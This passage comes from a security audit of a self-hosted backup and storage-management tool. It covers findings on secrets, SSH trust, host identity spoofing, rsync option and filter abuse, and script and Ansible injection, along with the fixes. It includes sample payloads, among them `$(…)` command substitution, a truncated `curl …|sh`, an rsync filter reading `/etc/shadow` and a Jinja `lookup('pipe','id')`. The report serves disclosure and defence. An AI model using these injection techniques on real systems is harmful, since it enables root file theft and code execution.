ARG PYTHON_IMAGE=python:3.13-slim-bookworm@sha256:<digest>
# build stage
COPY requirements.lock ./
RUN /opt/venv/bin/pip install --require-hashes -r requirements.lock && /opt/venv/bin/pip install --no-deps .
# runtime stage, after apt
RUN rm -rf /usr/local/lib/python3.13/site-packages/pip /usr/local/bin/pip*
```

Generate `requirements.lock` with `pip-compile --generate-hashes`. Let Dependabot or Renovate bump the digest, and scan images in CI (`trivy image storageforge:0.2.0`).

---

### SF-10 — Host secret files world-readable (mitigated by 0700 dir); stale token file

| | |
|---|---|
| **Severity** | 🟡 Low |
| **Component** | `docker/init-secrets.sh` (`chmod 0644`), `secrets/api_token` |

**Why this is insecure.** The files are `0644` so the container UID can read the bind-mounted secret. Their only protection is the `0700` parent directory. That protection breaks quietly if anyone runs `chmod 755 secrets`, copies the files elsewhere with `cp -p`, or includes them in a backup tarball: the vault master secret is then readable by every local user. `secrets/api_token` is referenced nowhere in the code. An unused secret is pure risk: it is easy to forget and nobody knows what it unlocks.

**Remediation.** `chown 10001:10001 secrets/*` and `chmod 0400`. Or use compose's long-form secrets (`uid: "10001"`, `mode: 0400`) where supported (Swarm, or recent Compose with non-file sources). Delete `secrets/api_token` after confirming nothing external uses it.

---

### SF-11 — SSH subprocesses inherit the full process environment

| | |
|---|---|
| **Severity** | 🟡 Low |
| **Component** | `remote.py:103, 109, 114` (no `env=`) |

**Why this is insecure.** If an operator uses `STORAGEFORGE_VAULT_SECRET` / `STORAGEFORGE_SESSION_SECRET` as plain environment variables instead of `*_FILE`, every `ssh` child inherits them. Any `ProxyCommand`, `LocalCommand` or `Match exec` in an ssh config (or a compromised ssh binary) then sees the master secret, and so does `/proc/<child>/environ` for the child's lifetime. `keyinstall.py` and `runner.py` already pass a minimal `env`. `remote.py` is the outlier.

**Remediation.** Pass `env={'PATH': …, 'HOME': …, 'SSH_AUTH_SOCK': sock, 'LANG': 'C.UTF-8'}` in `Transport`. Optionally `os.environ.pop()` both secrets after reading them at start-up.

---

### SF-12 — Unrestricted egress and a flat bridge network

| | |
|---|---|
| **Severity** | 🟡 Low |
| **Component** | `docker-compose.yml` `networks`, `examples/demo/compose.demo.yml` |

**Why this is insecure.** The container needs outbound SSH to the fleet, but it can reach **any** address on **any** port. That widens SF-04 and gives any code-execution foothold free exfiltration. The demo target joins the same `sf` network. If someone runs the demo override next to production, a disposable container with a looser sshd sits beside the vault.

**Remediation.** Restrict egress at the host. With `sf0` named, `iptables -I DOCKER-USER -i sf0 -p tcp ! --dport 22 -j REJECT` (plus explicit allows for ntfy/gotify ports, if used). Give the demo its own `networks: [demo]`, and document that `compose.demo.yml` must never be combined with production data volumes.

---

### SF-13 — Informational

| Item | Why it's noted |
|---|---|
| `POST /api/logout` has no CSRF token | `SameSite=Strict` already blocks cross-site cookies. Logout-CSRF is only a nuisance. |
| Side-effecting GETs (`/api/deploy/jobs/<jid>/browse`, script downloads) | Safe today because of `Strict`. They become CSRF-able if someone relaxes to `Lax`. Make them POST. |
| Library `ValueError` text returned to the client | Authenticated only, but could show internal detail. Prefer authored messages. |
| `style-src-attr 'unsafe-inline'` | Allows CSS injection via `style=""` if HTML injection ever appears (no script). The UI uses `textContent`, so the risk is low. |
| `/api/jobs/report` duplicate check is by `run_uuid` only | A leaked job token lets someone forge "ok" runs for that one job and mask a failing backup. Accept only runs whose timestamps fall within the job's schedule window, and alert on runs reported from an unexpected source IP. |
| No CORS | ✅ Intentional and correct. Never add `Access-Control-Allow-Origin: *` with credentials. |

---

## 5. Actionable Hardening Checklist

### 🔴 P0 — now

- [x] **SF-01** Validate `src.host`/`dst.host` in `moves.normalize` and `host` in `changes.normalize` with `keyinstall.HOST` (as `tasks.normalize` does)
- [x] **SF-01** Collapse whitespace in `note` fields (`' '.join(x.split())`) in moves and changes
- [x] **SF-01** Add a `comment()` helper and use it for every `#` line in `moves.script`, `changes.script`, `changes.ansible`, `tasks.script`, `shares.script`
- [x] **SF-01** Regression test: a newline in any free-text field produces no un-commented line in the script header
- [x] **SF-05** Clamp `limit` to `[1, cap]` on `/api/search`, `/api/audit`, `/api/deploy/runs`

### 🟠 P1 — this week

- [x] **SF-03** Server-side revocation on logout (`web_sessions` table), 30-min sessions adjustable to 8 h
- [x] **SF-04** Block loopback, link-local and multicast alert targets (private LAN allowed), disable redirects, return generic errors
- [x] **SF-04** Clear a stored channel token when that channel's URL host changes
- [x] **SF-06** Default `STORAGEFORGE_COOKIE_SECURE=1`; rename the cookie to `__Host-sf_session`; HSTS on https
- [x] **SF-02** Step-up re-authentication (5 min window) for deploy apply, job actions, restore, key generate/install, access/deploy grant, alert settings

### 🟡 P2 — next release

- [ ] **SF-02** Roles (`viewer` / `planner` / `admin`) with a `@requires()` decorator
- [ ] **SF-02** Optional TOTP, required once any host has deploy access
- [ ] **SF-02** Move the signing key into a separate signer process
- [x] **SF-07** Per-user limiter keyed on user + client network; alert on limit hits
- [x] **SF-08** Minimal unauthenticated `/healthz`; drop the version from `Server`
- [x] **SF-09** Pin the base image by digest; hashed `requirements.lock`; remove system pip · Trivy in CI not set up (no CI)
- [x] **SF-10** Secret files `0640` + `group_add` (instead of chown to 10001) · `secrets/api_token` left for the owner to decide
- [x] **SF-11** Minimal `env=` for every `subprocess` in `remote.py`
- [x] **SF-12** `DOCKER-USER` egress rule on `sf0`; separate network for the demo target
- [x] **SF-13** Convert side-effecting GETs to POST

### ✅ Keep (regression guard)

- [ ] `USER 10001`, `read_only`, `cap_drop: ALL`, `no-new-privileges`, tmpfs runtime, app port unpublished (TLS proxy only), `*_FILE` secrets
- [ ] `@login_required` on every new `/api/*` route (consider a test that walks `web.url_map` and fails on unauthenticated routes outside an allow-list)
- [ ] JSON-only bodies and no CORS
- [ ] `shlex.quote` for every value in generated scripts; regex-validated IDs before shell interpolation


## 6. Addendum: on-host programs and the compromised-host threat model

The first pass looked at an attacker coming through the web UI. This pass asks a different question: **what can someone who already controls *one* machine do to StorageForge, or through it to the others?** That machine could be a scanned host, a backup destination holding job keys, or a source host with untrusted local users. It also covers the two programs StorageForge installs on every host and runs as root: `storageforge-run` (`deploy.py` `RUNNER_SCRIPT`) and `storageforge-job` (`jobscript.py`).

> [!summary] Results
> | ID | Title | Severity | Status |
> |---|---|---|---|
> | SF-14 | Report URL and mount paths injected into root deploy scripts | 🔴 High | ✅ fixed |
> | SF-15 | Job keys could read any file as root on source hosts (rsync `-s` bypass) | 🔴 Critical | ✅ fixed |
> | SF-16 | A host's self-reported hostname can take over another host's identity | 🔴 High | ✅ fixed |
> | SF-17 | Planner build scripts and HTML use scanned names unescaped | 🟠 Medium | ✅ fixed |
> | SF-18 | `storageforge-run` binds requests to the short hostname; nonce check is not atomic | 🟡 Low | ✅ fixed |
> | SF-19 | Job keys can trigger pre/post hooks at any time; sudoers `--serve *` | 🟡 Low | accepted (documented) |
> | SF-20 | Client-sent rsync filter rules made the root sender read and print any file (first line of `/etc/shadow`) | 🔴 High (re-rated) | ✅ fixed |
> | SF-21 | SSH trust: first-use host keys, `ssh -A` in move scripts | 🟠 Medium | ✅ fixed |
> | SF-22 | Scans let a host forge its own job runs and drift results | 🟡 Low | accepted |

### What holds up (verified)

- **`storageforge-run`'s core check is sound.**
  - It verifies an SSHSIG over the *whole* payload (header and script) with `ssh-keygen -Y verify`. The namespace and principal are pinned in a root-owned `allowed_signers`.
  - It parses the header from the same verified bytes.
  - It enforces a 10-minute age and 5-minute clock skew, plus a single-use 128-bit nonce kept for 24 h, longer than the window.
  - Arguments are limited to `[A-Za-z0-9=_./:,@+ -]`, and the environment is reset by `sudo`.

  **Why that matters:** the deploy SSH key alone can only feed this program, and it runs nothing it can't verify. A stolen deploy key is useless without the signing key, which never leaves the vault.
- **The forced commands quote correctly.** Job keys use `command="sudo -n storageforge-job --serve <id> \"$SSH_ORIGINAL_COMMAND\""`, and the deploy key uses `restrict`. The double quotes stop the client's command from being re-split by the shell.
- **Snapshot browse/restore** validate the snapshot name (`[a-z]+\.\d+`) and reject `..` and absolute paths, both on the server and again in `storageforge-job` (`snap_ok`, `rel_ok`).

---

### SF-14 — Report URL and mount paths injected into root deploy scripts ✅ fixed

| | |
|---|---|
| **Severity** | 🔴 High |
| **Component** | `jobs.py:288, 304-305` (`host_script`), `tasks.py` (`fail "cannot make …"`), `alerts.py` (`URL_RE`) |

**Why it was insecure.** The jobs deploy script printed status with values *inside double quotes*: `ok "reports reach {report_url}"` and `ok "destination mount {dst_mount}"`. In bash, `$(…)` and backticks inside double quotes still run. `URL_RE` refused spaces and quotes, but it accepted `$(…)`. The mount path comes either from **the destination host's own scan** (a compromised host picks its mount point names) or from a saved design. The script runs as root through a signed deploy. So a report URL of `http://10.0.0.5:8443/$(touch${IFS}/tmp/pwned)` ran on **every host that runs deployed jobs**, at the next deploy, without appearing anywhere as a command.

**Fix.**
- Values are passed only as `shlex.quote`d words: `ok 'destination mount /mnt/…'`. The same change was made to three `fail "cannot make {path}"` lines in `tasks.py`.
- The report URL now has its own strict pattern, `REPORT_URL_RE`: scheme, host, port and a plain path, no shell characters.
- The job header's plan name and host go through `one_line()`.
- Test: `test_scanned_and_designed_paths_stay_quoted_in_root_scripts` builds a job from a host whose mount point is `/mnt/$(touch /tmp/PWNED)`. It asserts nothing outside single quotes or quoted heredocs contains it, and that `$(…)`, backticks, quotes and `;` are refused in report URLs.

---

### SF-15 — Job keys could read any file as root on source hosts ✅ fixed

| | |
|---|---|
| **Severity** | 🔴 Critical (any one backup destination → every file on every host it pulls from) |
| **Component** | `jobscript.py` `serve()`, the `rsync --server --sender` branch |

**Why it was insecure.**
- **What the gatekeeper does.** A deployed job's **runner** (the backup destination) holds an SSH key for the **source** host. On the source, that key's forced command is `storageforge-job --serve`. It rebuilds the rsync sender command and checks that the requested path is under the job's root, then runs rsync **as root**.
- **The flaw.** The option check was a *denylist* that compared whole words, so it refused `-s` but let `-se.LsfxCIvu` through, because rsync accepts short options bundled into one word. With `-s` (secluded/protect args), the rsync server **reads the real file arguments from the connection** and ignores the path that was checked.
- **Reproduced** with an unprivileged harness in the scratchpad (stock rsync 3.5.1, the real `JOB_SCRIPT`, a stand-in for sshd's forced command). The client sent `-se.LsfxCIvu . <decoy path inside the root>` and asked for a file outside the root, and the file came back (`TOP-SECRET`).
- The same denylist also let `-L`/`-k` through (follow symlinks out of the root as root) and any option it didn't know about.

**Exploit scenario.** Root on a backup NAS (or just a copy of `/etc/storageforge/jobs/<id>.key` from it) gives read access as root to *any* file on each source host: `/etc/shadow`, SSH host keys, other services' secrets. That's more than the folder being backed up.

**Fix.** The check is now an **allowlist** of exactly what StorageForge's own jobs send, captured from real runs:
- short letters `nlHogDtpAXrcxRzvi`, optionally followed by the `e<capabilities>` word,
- `--numeric-ids`, `--bwlimit=N`, `--info=…` and `--debug=…`,
- everything else is refused.

I re-ran the harness: every job variant (copy, mirror, checksum, verify, rsnapshot `--relative`, compress) still works. `-s` in a cluster, `-L`, `-k`, `--protect-args` and `--files-from` are refused, and the attack copies nothing. Test: `test_job_keys_only_get_rsync_options_our_jobs_use`.

**Residual:** SF-20 (filter rules arrive over the connection, not the command line).

---

### SF-16 — A host's self-reported hostname can take over another host's identity ✅ fixed

| | |
|---|---|
| **Severity** | 🔴 High |
| **Component** | `remote.py:183` (`hostname -f`), `scanner.py` → `db.upsert_host` (`ON CONFLICT (hostname) … ssh_host = excluded.ssh_host`), `runner.connect_address`, `deploy.run/raw/enroll`, `access.grant` |

**Why it is insecure.**
- **How identity is decided.** A scanned host's identity is **whatever that host prints** for `hostname -f`. `upsert_host` treats the name as the key: a scan from address B that reports `nas.lan` **overwrites the existing `nas.lan` row**, including `ssh_host`, the address every later connection uses (`connect_address`).
- **Why the deploy checks don't help.** Deploy requests are signed for `host_slug(name)`, and B controls its own `uname` too, so its `storageforge-run` accepts them.

**Exploit scenario.** Root on any one scanned host (B) sets its hostname to `nas.lan` and waits for the scheduled scan:
- **Address takeover.** From then on, StorageForge sends everything meant for nas to B.
- **Secret theft.** B receives the next deploy, which includes **fresh job tokens and job SSH keys** for nas's jobs. With SF-15 now fixed, those keys can still pull the backed-up folders from nas's sources.
- **Password theft.** If anyone uses Deploy access or Access grant for "nas", the **sudo password they type** goes to B.
- **Corrupted records.** nas's index, drift and alerts are overwritten with B's data, and nas stops getting deploys and scans.

**Remediation (recommended).**
1. Make the **SSH host key** the identity:
   - Store the host-key fingerprint per `hosts` row on first scan.
   - Refuse an upsert, and alert, when a scan from a different address claims an existing name with a different host key.
   - Never change `ssh_host` silently.
2. Key deploy, enroll and access targets on the row's **pinned address and host key**, not on the name.
3. For deploys, bind requests to `/etc/machine-id` captured at enrollment (this also covers SF-18).

**Fix (2026-10-29).**
- **Identity is what SSH verified, not what the host says.** `Transport.host_keys()` reads the fingerprints that ssh verified for the scanned address from StorageForge's own `known_hosts`. The machine proved it holds those keys; it can't claim someone else's. They're pinned per host (`hosts.host_keys`, migration 014).
- **`upsert_host` no longer overwrites by name.** A scan claiming an indexed name with other host keys is refused (`HostIdentityError`): the scan fails, it's audited, and the real host's address, index, deploys and drift stay untouched. The match is case-insensitive and also covers **the same short name** (`nas` vs `nas.lan`), because host matching and `storageforge-run` compare short names.
  - The same machine at a new address (same keys) is accepted, and the address is updated.
  - Rows from before pinning are adopted only when scanned at the address they were last scanned at.
- **`canonical()`** (scan queue and deploys) matches by name first, then by the address a host was scanned at, and only then by the IP it reports about itself.
- **Deploys are bound to `/etc/machine-id`.** Scans record it. `request()` signs it into the header, and `storageforge-run` refuses a request whose `machine:` differs from the host's. Hosts never scanned fall back to the name check.
- **Existing hosts get the new runner automatically.** Every signed script now starts with a silent snippet that replaces `storageforge-run` when it differs, so hosts already set up don't need the setup run again.
- **Reinstalled or moved host:** `storageforge-index hosts rekey <name>` forgets its pinned keys and its `known_hosts` lines (audited), and the next scan pins it again.
- **Verified** with unit tests (`HostIdentityTests`: takeover by name, other case and short name; legacy adoption; rekey; `canonical()` order; `known_hosts` parsing), a test driving the real runner with a real SSHSIG (machine id mismatch refused, replay refused, runner refresh silent), and **over real SSH**:
  - Two copies of the demo SSH target both called `demo-target`: the real one at 127.0.0.1, and an impostor with fresh host keys at 127.0.0.2.
  - The real one was pinned; the impostor's scan was refused with nothing changed; the real one still scanned.
- **Residual: first contact is still trust-on-first-use (SF-21).** Whoever answers first at a new address is pinned. Pinning stops a *later* takeover; it can't tell you the first answer was genuine.

---

### SF-17 — Planner build scripts and HTML use scanned names unescaped ✅ fixed

| | |
|---|---|
| **Severity** | 🟠 Medium |
| **Component** | `static/planner.js`: 765 `${…}` interpolations without `esc()`/quoting (many are numbers or fixed strings; the risky ones carry names from designs and scans), e.g. `run wipefs --all /dev/${d.dev}` (`:491`), `run parted … /dev/${d.dev} mkpart ${p.label…}` (`:495`), `run vgcreate ${pool.vg} …` (`:512`), `data-node="disk:${d.dev}"` (`:713`) |

**Why it is insecure.** The planner turns a design (taken from a scan or edited by any user) into a "build this host from bare disks" bash script that wipes and partitions disks. Device names, partition labels, VG/LV/pool/dataset names and mount targets go into commands **unquoted**. A scanned or designed device name such as `sdb /dev/sda` makes `wipefs --all /dev/sdb /dev/sda` wipe a second disk. `sdb; curl …|sh` runs a command. In the page itself, unescaped values inside attributes allow markup and `style` injection. The CSP blocks script execution, but not fake UI.

**Remediation.** Add a `sh()` single-quote helper in `planner.js` and use it for every value in generated commands. Validate device and pool names against their kernel/tool grammars (`^[A-Za-z0-9._:-]+$`) when a design is saved (`PUT /api/planner/design`). Use `esc()` for every attribute and text value.

**Fix (2026-10-29).**
- **One entry point for data.** Every design (from the server, or a draft kept in the browser), the host list and the activity data pass through `scrub()` when they enter the planner. It strips control characters (they end a line or a comment in a generated script) and `< > " `` ` `` (they end HTML text or a quoted attribute). So no template can be broken out of, escaped or not; hand-proving all 765 interpolations wasn't needed.
- **Identifiers are held to their tools' character set** (`tidy()`): device and partition IDs, pool, VG and LV names, fs type, level, ZFS properties, and dataset/subvolume names (with `/`). `sdb /dev/sda` becomes `sdb__dev_sda`, never two arguments to `wipefs`.
- **Free text is quoted.** Labels, mount points, link paths, `zpool -m`, dataset mount points and `/dev/disk/by-id` names go through `sh()`. fstab fields get octal escapes (`\040`). Ansible values are JSON strings (valid YAML), and `register:` names are made safe.
- **The server refuses bad designs on save.** `PUT /api/planner/design` runs `blueprint.check_text()`: any string with those characters, or an identifier outside its grammar, gets a 400 naming the field. The bundled atlas example passes.
- **Verified in the browser** with a hostile design stored the way scan data arrives:
  - The model `<img … id=PWNIMG>` rendered as text, and no element was created.
  - The label `data';touch /tmp/PWNED;'` came out as one quoted word in `mkpart` and `mkfs -L`.
  - `/srv/my data` came out as `'/srv/my data'` in bash and `/srv/my\040data` in fstab.

---

### SF-18 — `storageforge-run`: short-hostname binding; nonce check not atomic ✅ fixed

| | |
|---|---|
| **Severity** | 🟡 Low |
| **Component** | `deploy.py` `RUNNER_SCRIPT` (`me=$(slug "$(uname -n)")`, `[[ -e $STATE/seen/$nonce ]] && die; : >"$STATE/seen/$nonce"`) |

**Why it is insecure.**
- **Host binding.** A request is bound to the *short* hostname slug, and each host keeps its own nonce store. Two machines called `nas` (`nas.home`, `nas.office`), or a renamed machine, accept each other's requests. Someone who captures a request on one (root there) can replay it on the other within 10 minutes.
- **Nonce race.** Checking for the nonce file and then creating it isn't atomic, so two simultaneous replays can both pass.

**Remediation.**
- Sign `/etc/machine-id` (recorded at enrollment) into the header and compare it on the host.
- Claim the nonce atomically with `set -o noclobber; : >"$STATE/seen/$nonce" || die …` (or `mkdir`).

**Fixed (2026-10-29)** with SF-16:
- Requests carry the host's machine id, and the runner compares it.
- The nonce is claimed with `noclobber` in a subshell, so only one of two concurrent replays can create the file.
- Both are covered by `test_runner_checks_machine_id_and_claims_nonces_once`.

---

### SF-19 — Job keys trigger hooks at will; sudoers `--serve *` (accepted)

| | |
|---|---|
| **Severity** | 🟡 Low |
| **Component** | `jobscript.py` `serve()` (`pre`, `post`, `snap`, `unsnap`), `deploy.py` SETUP sudoers line |

**Why it matters.** Whoever holds a job key (root on the runner) can run the source's `pre`/`post` commands and take snapshots **whenever they like**. With hooks like `docker compose stop`, that's a denial of service. The sudoers rule `storageforge-job --serve *` lets the `storageforge-deploy` user run `--serve` for *any* job ID without a signature. Today nothing gives that user a shell (both keys have forced commands), so it adds nothing beyond the job keys. It would matter if that account were ever reachable another way.

**Accepted** because backups by design trust the runner with the source's data. Documented so it isn't widened later.

---

### SF-20 — Client-sent rsync filter rules read files as root (older rsync echoes them) ✅ fixed

| | |
|---|---|
| **Severity** | 🔴 High (re-rated from Low after testing) |
| **Component** | `jobscript.py` `serve()` |

**Why it matters.** Filter rules travel over the rsync connection, not the command line, so the SF-15 allowlist can't see them. A client rule like `--filter=': /etc/shadow'` makes the **root sender read that file** as rules. rsync 3.5 reports only `<rule from /etc/shadow line 1>`; I didn't test whether older versions (3.1/3.2, still shipped by LTS distros) print the rule text. If they do, the first word of each line leaks back to the job-key holder.

**Remediation.** Require rsync ≥ 3.2.x on sources (check it in the setup script). Or run the sender with privileges dropped to read-only `CAP_DAC_READ_SEARCH`. Or move to an rrsync-style wrapper that also refuses unknown protocol options.

**Tested (2026-10-29): worse than estimated.** rsync **3.1.3 and 3.2.5** (what LTS distros ship) print the rule text. `--filter=': /etc/shadow'` returned `Unknown filter rule: 'root:$6$…'`: root's password hash, to whoever holds a job key. Requiring a newer version wouldn't help, since 3.2.5 leaks too.

**Fix.** Sources now serve jobs only through **rsync's daemon mode over the job key's SSH session, chrooted into the job's root**:
- **What the source runs.** `storageforge-job --serve` accepts only `rsync --server --daemon .`, with a one-off config: module `src` (the job's root), module `snap` (its btrfs snapshot), `use chroot = yes`, `read only = yes`, `list = no`, and `refuse options` for remove/delete/batch/log-file. The config is removed by a `trap`.
- **What the runner asks for.** Jobs request `storageforge-deploy@host::src/` (or `::snap/`). rsnapshot, which reads `host::module` as a TCP daemon, reaches it through `RSYNC_CONNECT_PROG`.
- **Old clients get a clear error.** The old `--server --sender` form is refused with "redeploy the plan". A plan deploy updates both sides together.
- **Verified as root** (the only place `chroot` works), in a throwaway Alpine container with rsync 3.2.5 and the real script:
  - The normal copy, mirror flags (`--delete-after`, `-c`, `-x`, `--partial-dir`), verify flags and rsnapshot all work.
  - The `/etc/shadow` merge rule printed nothing.
  - `-L` through a link to `/etc/shadow`, `::src/../../etc/shadow` and `-s` with an absolute path all resolve inside the job's root.
  - A push into the source is refused (read-only module), and so is `--remove-source-files`.
- **In CI:** `test_job_keys_read_the_job_folder_and_nothing_else` runs as root in the Dockerfile `test` stage (rsync added there), and `test_job_keys_only_reach_the_chrooted_daemon` runs everywhere. The SF-15 option allowlist became unnecessary and was removed with the old branch.
- **Side fix:** `mktemp` templates no longer use a suffix after `XXXXXX`, which BusyBox refuses.

---

### SF-21 — SSH trust: first-use host keys, agent forwarding ✅ fixed

| | |
|---|---|
| **Severity** | 🟠 Medium |
| **Component** | `remote.py` (`StrictHostKeyChecking=accept-new`), `keyinstall.py`, `scriptkit.REMOTE` (`ssh -A`) |

**Why it matters.**
- **First-use trust.** The first connection to an address trusts whatever answers. On a LAN, a spoofed ARP or DHCP response during first enrollment means the **sudo password** typed into Access/Deploy access, and every later scan, go to the impostor. After that, a host-key change is refused, which is good.
- **Agent forwarding.** Downloadable move scripts run with `ssh -A`. While the script runs, root on that host can use **your SSH agent** to log in anywhere your keys work.

**Remediation.**
- Show the host-key fingerprint in the UI on first contact and require confirmation before any password is sent. Optionally import known host keys from an existing `known_hosts`.
- Replace `ssh -A` with per-step job keys (as deploys already do), or document it clearly and use `ssh-add -c` (confirm each use).

**Fix (2026-10-29).**
- **A password goes only to a host key a person confirmed.** Key install, scan-access grant and deploy access refuse with **409** (`hostkey`: host, port, fingerprints) unless the key StorageForge holds for that address and port is in `host_key_confirmations` (migration 015).
  - If the address is new, `hostkeys.offered()` fetches the key the server presents without trusting it or authenticating: the connection carries only the key exchange.
  - The UI catches the 409 and shows the fingerprint, with `ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key.pub` to compare on the host.
  - "They match" posts `/api/hostkey/confirm` (signed in, recent password, audited `ssh.hostkey.confirm`). That pins the key if it wasn't pinned yet, and only if the host still presents the same one. Then the request is retried.
- **The password connections are strict.** They now use `StrictHostKeyChecking=yes` (`Transport(strict=True)`, ssh-copy-id, the admin sudo path), so a key that changes between confirming and sending is refused.
- **Scans keep trust-on-first-use**, but pinning (SF-16) stops a later takeover, and a key a scan pinned still has to be confirmed by a person before any password goes there.
- **Agent forwarding is opt-in.** Move, change, share and task scripts forward your agent with `--host` only when `--forward-agent` is also given, and say why it matters. The "cannot reach" hint suggests it.
- **Verified.** Against a real sshd, `offered()` returned exactly the host's own ED25519 fingerprint (`ssh-keygen -lf` inside the container). Before confirming, a password would be refused; after, a strict connection accepts the key. The key-install route test now walks 409 → wrong fingerprint refused → confirm → install.

---

### SF-22 — Hosts can forge their own job runs and drift results (accepted)

| | |
|---|---|
| **Severity** | 🟡 Low |
| **Component** | `jobs.ingest_scan` (runs read from `/var/lib/storageforge/jobs/*/runs.jsonl` during scans), drift checks in `alerts.py` |

**Why it matters.** Run history and drift (file checksums, timers) come from the host itself. A compromised host can report "ok" runs and clean drift, and hide a stopped backup. **Accepted:** a host you don't trust can't attest to itself. The independent check is a **verify run from the destination side**, plus restore tests from snapshots.

---

### Checklist (addendum)

- [x] **SF-14** Quote report URL and mount paths in job scripts; strict `REPORT_URL_RE`; quote `tasks.py` messages
- [x] **SF-15** Allowlist rsync sender options in `storageforge-job --serve`
- [x] **SF-16** Pin hosts by SSH host key / address; refuse hostname takeovers; bind deploys to `machine-id`
- [x] **SF-17** `sh()` quoting and `esc()` everywhere in `planner.js`; validate device/pool names on save
- [x] **SF-18** Sign and check `machine-id`; atomic nonce claim (`noclobber`)
- [x] **SF-20** Minimum rsync version on sources, or a reduced-privilege sender
- [x] **SF-21** Confirm the host key before any password is sent; drop `ssh -A` from move scripts

## 7. Second full audit (2026-10-29)

After SF-14 to SF-22, a fresh pass over everything, using tools instead of reading alone:
- **Generator canary sweep.** I put the payload ``$(touch${IFS}/tmp/CANARY)`id`"q;x`` in every free-text field the validators accept, across every change type, every task block type, move plans, both sides of job deploys and share scripts (39 outputs). Then I checked that it only appears where bash treats it as data: in single quotes, a quoted heredoc or a comment.
- **Route coverage.** Every registered route and method was called without a session.
- **Live tests** of the restore path (GNU tar as root, with a hostile archive) and of output limits.
- **Reading:** the vault's crypto, every HTML sink in the UI, and the git source path.

> [!summary] Results
> | ID | Title | Severity | Status |
> |---|---|---|---|
> | SF-23 | Source-side job script ran a move plan's source path as code | 🔴 High | ✅ fixed |
> | SF-24 | Jinja2 in names and paths was rendered by Ansible on the controller | 🟠 Medium | ✅ fixed |
> | SF-25 | A restore from a compromised backup host could plant setuid-root files | 🟠 Medium | ✅ fixed |
> | SF-26 | A compromised host could print until StorageForge ran out of memory | 🟠 Medium | ✅ fixed |
> | SF-27 | Keyless (locked-vault) audit entries can be rewritten undetected | 🟡 Low | ✅ reported in verify |

### SF-23 — Source-side job script ran the source path as code ✅ fixed
`jobs.host_script` for the **source** host wrote `ok "source {path}" || conflict "source {path} does not exist"`. Paths may hold `$(…)` (only `..` and line breaks are refused), and inside double quotes bash runs it, as root, at the next deploy. The canary sweep caught it; reading had missed it twice (SF-01, SF-14). **Fix:** quoted words, like SF-14. **Guard:** `test_no_generator_lets_a_value_run_as_code` repeats the sweep on every test run.

### SF-24 — Jinja2 in generated Ansible ✅ fixed
Ansible renders Jinja2 in every module argument. A change-plan path such as `/srv/{{ lookup('pipe','id') }}` became `path: /srv/{{ lookup('pipe','id') }}` and would have run `id` **on the machine running the playbook**: the operator's laptop, not the target. The planner's playbook had the same issue. **Fix:** any string with `{{`, `{%` or `{#` is emitted as `!unsafe "…"`. That's Ansible's own marker for literal data, and it's still valid YAML. The playbooks' own Jinja lives in `when:`, which takes no user data.

### SF-25 — Setuid bits survive a restore ✅ fixed
A restore streams `tar` from the backup host and extracts it **as root** on the source. With a hostile archive, GNU tar 1.35 refused `../`, absolute names, a write through a planted symlink and a hard link out of the folder. But it **kept a setuid-root file**. A backup host that was taken over could therefore restore a setuid-root binary that any local user who can reach the folder runs as root. **Fix:** `unpack` strips setuid/setgid from everything it extracted, whether or not tar finished, and says how many files it changed. Verified as root in a container.

### SF-26 — Unbounded output from hosts ✅ fixed
`Transport.run` (the inventory, and every remote command that isn't streamed), the Docker inventory and the git survey read a host's whole output into memory, and the stderr reader read lines of any length. The container is limited to 2 GiB, so a host printing gigabytes got the server OOM-killed, stopping scans, alerts and backups. **Fix:** `read_capped()` stops at 64 MiB, kills the process and fails with a clear error. stderr lines are read in 64 KiB pieces, and `Transport.run`'s timeout still applies. (Deploy output was already capped at 256 KiB, and the file index streams in bounded chunks.)

### SF-27 — Keyless audit entries ✅ reported
Each audit row records its own algorithm, and rows written while the vault was locked use plain SHA-256. Someone who can write the database file (past the triggers) could delete entries and re-chain the rest as keyless rows, and `verify` would still say intact. Rejecting keyless rows would break legitimate locked-vault entries, so `verify` (API, UI, CLI) now reports how many entries are keyless and flags any that **follow** a keyed one, from the first such entry on.

### Checked and sound
- **Authentication coverage.** Of 84 route/method pairs, only `/login` and its assets, `/healthz` (status only) and logout answer without a session. `test_every_route_needs_a_session_unless_listed` keeps it that way.
- **HTML sinks.** Only the planner builds HTML from strings (now covered by SF-17's `scrub()`). The other views use DOM APIs and `textContent`.
- **Vault crypto.**
  - Argon2id (t=3, 64 MiB, 4 lanes) derives the KEK.
  - AES-256-GCM uses random 96-bit nonces, at a volume where that's safe.
  - The associated data binds each ciphertext to its key's UUID and purpose (DEK vs key).
  - The KEK is never stored, and secret rotation re-wraps only the DEKs.
- **Restore path handling.** GNU tar refuses traversal (tested), and `unpack` refuses targets outside the job's root (tested: `/etc/x`).

### Informational
- `git-upload-pack` runs as root on repositories inside a job's root with `safe.directory = *`. upload-pack doesn't run repository hooks or `fsmonitor`, and its pack hook is honoured only from protected config, so this is acceptable. Keep it to upload-pack.
- `/api/hostkey/confirm` makes StorageForge open an SSH connection to an address a signed-in user names. It requires a recent password and is audited. The answer (key, "no SSH server", "did not answer") reveals whether an SSH server listens there, which is a mild probing aid for an account that can already run commands on hosts.
- Job runs, drift and machine IDs come from the hosts themselves (SF-22): a host can lie about itself, never about another (SF-16).

### Checklist (second audit)
- [x] **SF-23** Quote the source path in source-side job scripts; canary sweep as a test
- [x] **SF-24** `!unsafe` for Jinja-looking strings in both playbooks
- [x] **SF-25** Strip setuid/setgid after every restore
- [x] **SF-26** 64 MiB cap on host output; bounded stderr lines
- [x] **SF-27** Report keyless entries after keyed ones in `audit verify`
- [x] Route-coverage test

---

> [!note] Method and limits
> Static review of the working tree (including uncommitted files), with targeted reproduction of SF-01 against a scratch SQLite database (`moves.script`, `changes.script`; `tasks.normalize` confirmed safe). Not covered: a live container run, image CVE scanning, the JavaScript UI (beyond the CSP), PostgreSQL-specific paths, `jobscript.py`/`storageforge-run` on-host scripts beyond the deploy docstring, and the full text of every check message. **§6 addendum:** `storageforge-run` and `storageforge-job` were read in full; SF-15 was reproduced and its fix re-tested against stock rsync 3.5.1 in an unprivileged harness; SF-14's test executes the generators; SF-16 and SF-17 are from code reading (not exercised end to end); SF-20 was observed on rsync 3.5.1 only.
